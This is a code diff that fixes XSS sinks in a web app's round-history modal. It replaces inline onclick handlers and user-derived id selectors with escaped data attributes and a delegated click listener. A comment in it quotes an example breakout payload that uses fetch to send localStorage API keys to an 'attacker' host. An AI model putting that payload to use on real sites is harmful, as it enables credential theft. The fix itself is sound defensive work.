@@ -21226,15 +21226,31 @@ function viewRoundDoc(idx) {
     return ai ? ai.name : id.charAt(0).toUpperCase() + id.slice(1);
   };
 
+  // v3.63.338 — XSS hardening (Codex security review). The reviewer id and
+  // h.phase/h.timestamp fields originate in the history blob, which a user
+  // can replace by restoring a crafted checkpoint. Pre-v3.63.338 those
+  // values landed unescaped inside an `onclick="switchHistTab('${id}',…)"`
+  // JS string literal AND a `id="histresp-${id}"` HTML attribute AND the
+  // header `innerHTML` — three sinks, any one of which let a crafted id
+  // like `x','foo');fetch('https://attacker/'+localStorage.getItem('waxframe_keys'));('y`
+  // break out and run arbitrary JS with full localStorage access (API keys
+  // live there). Fix: replace the inline onclick + computed id selector
+  // with data-tab-id attributes + a delegated click listener on the modal,
+  // and HTML-escape every dynamic value in the header. switchHistTab now
+  // looks up the active panel by data-panel-id instead of building an id
+  // string from user input.
   const tabButtons = hasResponses ? aiNames.map((id) =>
-    `<button class="work-phase-pill hist-resp-tab" onclick="switchHistTab('${id}',this)">${esc(getFriendlyName(id))}</button>`
+    `<button class="work-phase-pill hist-resp-tab" data-tab-id="${esc(id)}">${esc(getFriendlyName(id))}</button>`
   ).join('') : '';
 
   const tabPanels = hasResponses ? aiNames.map((id) =>
-    `<div class="hist-resp-panel" id="histresp-${id}">
+    `<div class="hist-resp-panel" data-panel-id="${esc(id)}">
       <textarea class="hist-doc-modal-ta" readonly>${esc(responses[id] || '(no response)')}</textarea>
     </div>`
   ).join('') : '';
+
+  const phaseLabel = (PHASES.find(p => p.id === h.phase)?.label) || h.phase || '';
+  const roundLabel = h.round === 0 ? 'Original' : String(h.round ?? '');
 
   const modal = document.createElement('div');
   modal.id = 'histDocModal';
@@ -21242,25 +21258,32 @@ function viewRoundDoc(idx) {
   modal.innerHTML = `
     <div class="hist-doc-modal-inner">
       <div class="hist-doc-modal-hdr">
-        <span>Round ${h.round === 0 ? 'Original' : h.round} — ${PHASES.find(p=>p.id===h.phase)?.label||h.phase} · ${h.timestamp}</span>
+        <span>Round ${esc(roundLabel)} — ${esc(phaseLabel)} · ${esc(String(h.timestamp || ''))}</span>
         <div class="view-round-tab-row">
           <button class="btn btn-ghost btn-sm" onclick="copyActiveHistTab()">📋 Copy</button>
-          <button class="btn btn-ghost btn-sm" onclick="restoreRound(${idx})">↩ Restore</button>
+          <button class="btn btn-ghost btn-sm" onclick="restoreRound(${Number(idx)})">↩ Restore</button>
           <button class="btn btn-ghost btn-sm" onclick="document.getElementById('histDocModal').remove()">✕ Close</button>
         </div>
       </div>
       <div class="view-round-tab-bar">
-        <button class="work-phase-pill hist-resp-tab active" onclick="switchHistTab('__doc__',this)">📄 Document</button>
-        <button class="work-phase-pill hist-resp-tab" onclick="switchHistTab('__notes__',this)">📝 Notes</button>
+        <button class="work-phase-pill hist-resp-tab active" data-tab-id="__doc__">📄 Document</button>
+        <button class="work-phase-pill hist-resp-tab" data-tab-id="__notes__">📝 Notes</button>
         ${tabButtons}
       </div>
-      <div class="hist-resp-panel active" id="histresp-__doc__">
+      <div class="hist-resp-panel active" data-panel-id="__doc__">
         <textarea id="histDocText" class="hist-doc-modal-ta" readonly>${esc(h.doc)}</textarea>
       </div>
-      <div class="hist-resp-panel" id="histresp-__notes__"><textarea class="hist-doc-modal-ta" readonly>${esc(h.notes || '(no notes saved for this round)')}</textarea></div>
+      <div class="hist-resp-panel" data-panel-id="__notes__"><textarea class="hist-doc-modal-ta" readonly>${esc(h.notes || '(no notes saved for this round)')}</textarea></div>
       ${tabPanels}
     </div>
   `;
+  // v3.63.338 — Delegated click listener replaces the per-button inline
+  // onclick. Listener is attached to the modal element itself, so when the
+  // modal is removed from the DOM the listener is GC'd with it.
+  modal.addEventListener('click', (e) => {
+    const btn = e.target.closest('.hist-resp-tab[data-tab-id]');
+    if (btn) switchHistTab(btn.dataset.tabId, btn);
+  });
   document.body.appendChild(modal);
 }
 
@@ -21269,7 +21292,11 @@ function switchHistTab(id, btn) {
   if (!modal) return;
   modal.querySelectorAll('.hist-resp-panel').forEach(p => p.classList.remove('active'));
   modal.querySelectorAll('.hist-resp-tab').forEach(b => b.classList.remove('active'));
-  const panel = modal.querySelector(`#histresp-${id}`);
+  // v3.63.338 — Look up the panel by data-panel-id with proper attribute-
+  // selector escaping instead of constructing an id selector from user input.
+  // Pre-v3.63.338 this was `modal.querySelector(\`#histresp-${id}\`)` which
+  // would happily explode on a crafted id (`foo"]; alert(1); //`).
+  const panel = modal.querySelector(`.hist-resp-panel[data-panel-id="${CSS.escape(id)}"]`);
   if (panel) panel.classList.add('active');
   if (btn) btn.classList.add('active');
 }
